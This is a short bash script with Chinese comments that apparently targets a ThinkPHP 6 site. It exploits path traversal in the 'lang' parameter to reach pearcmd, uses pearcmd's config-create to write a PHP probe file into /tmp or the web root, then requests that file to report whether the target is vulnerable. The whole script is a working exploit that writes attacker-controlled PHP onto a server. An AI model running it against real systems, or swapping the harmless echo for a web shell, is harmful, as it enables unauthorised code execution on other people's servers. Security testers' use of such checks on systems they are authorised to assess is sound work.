#!/usr/bin/env bash
# 步骤 1：用 pearcmd 写探针；步骤 2：访问探针确认
set -u
TARGET="${1:?usage: bash tp6.sh http://TARGET:PORT}"
BASE="${TARGET%/}"
PHP='<?php echo "TP6-LFI-OK"; ?>'
for pear in /usr/local/lib/php/pearcmd /usr/share/php/pearcmd.php /usr/local/lib/php/pearcmd.php; do
  for dest in /tmp/tp6probe.php /var/www/html/tp6probe.php; do
    url="$BASE/index.php?lang=../../../../../../..$pear&+config-create+/&$PHP+$dest"
    curl -sS -m 10 -o /dev/null "$url" 2>/dev/null
    if curl -sS -m 8 "${TARGET%/}${dest#/var/www/html}" 2>/dev/null | grep -q 'TP6-LFI-OK'; then
      echo "VULN  pear=$pear dest=$dest"; exit 0
    fi
  done
done
echo "SAFE  (pearcmd 路径可能不同：先作指纹与版本确认)"; exit 1
